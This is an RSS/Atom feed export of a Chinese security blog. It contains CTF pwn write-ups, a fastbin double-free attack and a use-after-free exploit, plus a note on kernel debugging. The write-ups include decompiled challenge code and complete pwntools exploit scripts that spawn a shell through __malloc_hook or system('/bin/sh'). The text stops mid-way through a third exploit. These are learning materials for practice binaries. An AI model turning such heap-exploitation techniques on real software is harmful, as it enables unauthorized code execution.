target="_blank" rel="noopener">https://paper.seebug.org/451/</a><br><a href="https://bbs.pediy.com/thread-230298.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-230298.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;辞职了,两个月真的是非常的快,感觉啥也没做就已经离开公司了,虽然日常经常做一些重复性,感觉没有很多技术含量的事情,但其实不知不觉能力得到了一
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>double free之Fastbin Attack</title>
    <link href="https://foyjog.github.io/2018/08/07/double-free%E4%B9%8BFastbin-Attack/"/>
    <id>https://foyjog.github.io/2018/08/07/double-free之Fastbin-Attack/</id>
    <published>2018-08-07T10:37:56.000Z</published>
    <updated>2018-08-07T11:13:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>抽时间做了一下安恒杯的第十一周周练,其中的一个fastbin attack还是让我学到了知识,在感概自己太菜的同时,还是要一步一个脚印踏实的走下去.</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>pwn题目都很简短,和reverse不一样.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_object</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> size; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( object_count &gt; <span class="number">15</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Enough"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">128</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v1 = size;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  v3 = object_count++;</span><br><span class="line">  object_array[v3] = v2;</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"Content &gt;"</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">puts_object</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v0 = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; <span class="number">0</span> || v0 &gt;= object_count )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid Index"</span>);</span><br><span class="line">  v2 = object_array[v0];</span><br><span class="line">  <span class="keyword">return</span> _printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"Buf[%d]:%s\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_object</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  v0 = read_choice();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt; object_count &amp;&amp; (v1 = (<span class="keyword">void</span> *)object_array[v0]) != <span class="number">0L</span>L )</span><br><span class="line">    <span class="built_in">free</span>(v1);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目只有上面的三个功能,从delete_object()可以看到,只对object做了free,没有取消掉bss段中的引用,所以这里造成了一个uaf的漏洞</p><h3 id="泄漏libc地址"><a href="#泄漏libc地址" class="headerlink" title="泄漏libc地址"></a>泄漏libc地址</h3><p>这个利用puts_object()泄漏main arena的top地址即可,和上次的练习是一样的,注意的事情就是第一次的malloc需要128个字节,不然的话被列入fastbin的话就无法泄漏地址了.</p><h3 id="覆盖malloc-hook"><a href="#覆盖malloc-hook" class="headerlink" title="覆盖malloc_hook"></a>覆盖malloc_hook</h3><p>因为题目没有edit功能,所以利用double free的fake trunk感觉使不上劲.所以这里采用fastbin attack来实现对任意地址的读写.</p><ol><li>malloc(1)</li><li>malloc(2)</li><li>free(1)</li><li>free(2)</li><li>free(3)<br>这个时候fastbin就变成了如下状态:<br><img src="/img/fastbinattack1.jpg" alt="fastbin"></li><li>malloc(“fb设置为任意地址”)<br><img src="/img/fastbinattack2.jpg" alt="fastbin"></li><li>malloc()<br><img src="/img/fastbinattack3.jpg" alt="fastbin"></li><li>malloc()<br><img src="/img/fastbinattack4.jpg" alt="fastbin"></li><li>malloc(“任意地址任意写入”)//获得任意地址并写入</li></ol><p>因为我们将malloc_hook改写成了libc中的exec(“bin/sh),所以我们直接调用malloc即可.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python # encoding: utf-8 </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context, process, log </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64, u64 </span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>, <span class="string">'-p'</span>, <span class="string">'60'</span>] </span><br><span class="line"><span class="comment"># context.log_Level = 'debug' </span></span><br><span class="line">r = process(<span class="string">"./tasty"</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, buf)</span>:</span> </span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"1"</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"Size:\n&gt;"</span>, <span class="string">"%d"</span> %size) </span><br><span class="line">    r.sendafter(<span class="string">"Content &gt;"</span>, buf) </span><br><span class="line">    r.recvuntil(<span class="string">"Done"</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, buf)</span>:</span> </span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"2"</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"Index:\n&gt;"</span>, <span class="string">"%d"</span>%idx) </span><br><span class="line">    r. sendlineafter(<span class="string">"New Size &gt;"</span>, <span class="string">"%d"</span>%size) </span><br><span class="line">    r.sendafter(<span class="string">"New Content &gt;"</span>, buf)</span><br><span class="line">    r.recvuntil(<span class="string">"Done"</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">(idx)</span>:</span> </span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"2"</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"Index:\n&gt;"</span>, <span class="string">"%d"</span>%idx) </span><br><span class="line">    r.recvuntil(<span class="string">"Buf[%d]:"</span> %idx) </span><br><span class="line">    <span class="keyword">return</span> r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>] </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span> </span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"3"</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"Index:\n&gt;"</span>, <span class="string">"%d"</span>%idx) </span><br><span class="line"></span><br><span class="line">pdb.set_trace() </span><br><span class="line">malloc(<span class="number">0x80</span>, <span class="string">"a"</span> * <span class="number">0x80</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>, <span class="string">"a"</span> * <span class="number">0x68</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>, <span class="string">"a"</span> * <span class="number">0x68</span>) </span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">unsorted = u64(printf(<span class="number">0</span>)[<span class="number">-6</span>:] + <span class="string">"\x00\x00"</span>) </span><br><span class="line">log. success(<span class="string">"Ox%x"</span> %unsorted) </span><br><span class="line">__malloc_hook = unsorted - <span class="number">0x68</span> </span><br><span class="line">one_garget = __malloc_hook - <span class="number">0x3c4b10</span> + <span class="number">0xf02a4</span> </span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">free(<span class="number">2</span>) </span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">malloc(<span class="number">0x68</span>, p64(__malloc_hook<span class="number">-0x13</span>).ljust(<span class="number">0x68</span>))</span><br><span class="line">malloc(<span class="number">0x68</span>, <span class="string">"a"</span> * <span class="number">0x68</span>) </span><br><span class="line">malloc(<span class="number">0x68</span>, <span class="string">"a"</span> * <span class="number">0x68</span>) </span><br><span class="line">payload = <span class="string">"aaa"</span> + p64(one_garget) </span><br><span class="line">malloc(<span class="number">0x68</span>, payload.ljust(<span class="number">0x68</span>, <span class="string">"\x00"</span>)) </span><br><span class="line"></span><br><span class="line">r. sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"1"</span>) </span><br><span class="line">r.sendlineafter(<span class="string">"Size:\n&gt;"</span>, <span class="string">"%d"</span> %<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/fastbin_attack/</a><br><a href="https://www.linkedbyx.com/forum/group/topic/71" target="_blank" rel="noopener">https://www.linkedbyx.com/forum/group/topic/71</a><br><a href="https://pan.baidu.com/s/1qHzDUPQy59LKlNm3wPgpzA" target="_blank" rel="noopener">https://pan.baidu.com/s/1qHzDUPQy59LKlNm3wPgpzA</a>  密码:s59a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;抽时间做了一下安恒杯的第十一周周练,其中的一个fastbin attack还是让我学到了知识,在感概自己太菜的同时,还是要一步一个脚印踏实的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>macOS下利用VMware Fusion进行linux内核调试</title>
    <link href="https://foyjog.github.io/2018/07/30/macOS%E4%B8%8B%E5%88%A9%E7%94%A8VMware-Fusion%E8%BF%9B%E8%A1%8Clinux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/"/>
    <id>https://foyjog.github.io/2018/07/30/macOS下利用VMware-Fusion进行linux内核调试/</id>
    <published>2018-07-30T06:45:18.000Z</published>
    <updated>2018-07-30T07:36:44.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近两周一直在做内核的fuzz,也没有好好调一下漏洞,有机会偷偷懒还是得调一调,不然手生 啊.</p><h3 id="mac下的调试方式"><a href="#mac下的调试方式" class="headerlink" title="mac下的调试方式"></a>mac下的调试方式</h3><p>刚开始利用了改写vmx下的debugStub.listen.guest64 = “1”设置来进行调试设置,但是gdb一直不能够read到一些内存,而且还不能中断,就很难受,所以改为双机调试.<br>首先参考<a href="http://eternalsakura13.com/2018/04/15/kernel_debug/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/04/15/kernel_debug/</a><br>进行内核的安装和符号文件的拉取,kernel对应的源代码,但是到双机调试的时候就出现问题了,vmwara fusion中没有添加pipe管道这么一个选项.<br>但是其实vmwarefusion是完全支持这么个调试方式的,参考如下如下的文章进行设置:<a href="https://github.com/coolbrain/enviroment-monitoring-system" target="_blank" rel="noopener">https://github.com/coolbrain/enviroment-monitoring-system</a><br>即可成功的进行调试.<br><img src="/img/kdb.png" alt="kdb被调试端"><br><img src="/img/gef.png" alt="gdb调试端"></p><p>利用CVE-2017-8890的poc运行一下.<br><img src="/img/crash.png" alt="crash"><br>可以发现能够正确的跟踪到segment fault.</p><p>如果没有设置好的话多参考参考下面的一些文章即可.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://insinuator.net/2014/01/serial-port-debugging-between-two-virtual-machines-in-vmware-fusion/" target="_blank" rel="noopener">https://insinuator.net/2014/01/serial-port-debugging-between-two-virtual-machines-in-vmware-fusion/</a><br><a href="https://github.com/coolbrain/enviroment-monitoring-system" target="_blank" rel="noopener">https://github.com/coolbrain/enviroment-monitoring-system</a><br><a href="http://eternalsakura13.com/2018/04/15/kernel_debug/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/04/15/kernel_debug/</a><br><a href="http://bestwing.me/2018/03/23/Linux_Kernel_Debugging_with_VMware_and_GDB/" target="_blank" rel="noopener">http://bestwing.me/2018/03/23/Linux_Kernel_Debugging_with_VMware_and_GDB/</a><br><a href="http://advdbg.org/" target="_blank" rel="noopener">http://advdbg.org/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近两周一直在做内核的fuzz,也没有好好调一下漏洞,有机会偷偷懒还是得调一调,不然手生 啊.&lt;/p&gt;
&lt;h3 id=&quot;mac下的调试方式&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>安恒杯第八次周周练writeup</title>
    <link href="https://foyjog.github.io/2018/07/16/%E5%AE%89%E6%81%92%E6%9D%AF%E7%AC%AC%E5%85%AB%E6%AC%A1%E5%91%A8%E5%91%A8%E7%BB%83writeup/"/>
    <id>https://foyjog.github.io/2018/07/16/安恒杯第八次周周练writeup/</id>
    <published>2018-07-16T10:32:37.000Z</published>
    <updated>2018-07-19T03:15:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉平台对我这种刚入门安全的人来说还是比较友好的,上次的月赛没有时间打,这周末看了一下竟然还有周周练,都是pwn题,所以拿来练练手,让自己多熟悉熟悉pwn类的题目.</p><h3 id="Unote"><a href="#Unote" class="headerlink" title="Unote"></a>Unote</h3><p>是一个32为的程序,checksec如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>拖进ida,程序比较简单,只有四个功能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">        UNote         </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your username:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;g_str_name, <span class="number">30u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      welcome();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并不用花太多时间了解题目,认真分析分析,就能发现存在uaf的利用点.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A090 ptr             dd ?                    ; DATA XREF: add_note+3C↑r</span><br><span class="line">.bss:0804A090                                         ; add_note+5C↑w ...</span><br><span class="line">.bss:0804A094                 dd ?</span><br><span class="line">.bss:0804A098                 dd ?</span><br></pre></td></tr></table></figure></p><p>ptr数组是bss段,delete_note之后并不会删除ptr数组的引用,所以这里导致了uaf的漏洞所在.<br>整体的exp流程思路如下,比较简单:</p><ol><li>创建两个note</li><li>删除这两个note</li><li>创建第三个note,将其content的大小置为8,所以第三个note的ptr[2]等于ptr[1],ptr[2][1] = ptr[0]</li><li>因为可以控制content,所以将ptr[0]设置为\x72\x86\x04\x08\x70\xa0\x04\x08</li><li>前四个字节为sub_8048672,刚好是system()函数(其实发现这个函数题目的意图就很明显了)</li><li>后四个字节为我们的bss段的g_str_name,我们将其设为/bin/sh即可.</li><li>调用print_note(2),即调用system(“/bin/sh”)</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./Unote"</span>)</span><br><span class="line">p = process(<span class="string">"./Unote"</span>)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#alloc note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"135168"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#alloc note2</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"135168"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#delete note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#delete note2</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#alloc note3 ,buffer 8 to note1</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"8"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"\x72\x86\x04\x08\x70\xa0\x04\x08"</span>)<span class="comment">#system to puts</span></span><br><span class="line"><span class="comment">#puts to system</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="over"><a href="#over" class="headerlink" title="over"></a>over</h3><p>这个题目比较少,具体代码和信息如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400676</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">80u</span>LL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">96u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>很明显的一个栈一处,但是溢出只有16个字节,我们很可能会想到构造rop链,但是16个字节的溢出太少,所以这里利用一个技术叫做Stack Pivot,通过两次leave达到控制esp和ebp的效果.<br>思路如下:</p><ol><li>通过send()79个字节溢出并泄漏ebp的地址.</li><li>计算ebp和buf的offset,通过stack pivot将esp设置为buf的地址.</li><li>开始rop,第一次rop通过puts(puts_got)泄漏puts的libc地址,计算system和字符串/bin/sh地址.</li><li>第二次rop,执行system(“/bin/sh”)</li></ol><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>有点乱,将就看吧….ebp的地址设置动态调出来的,没算…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 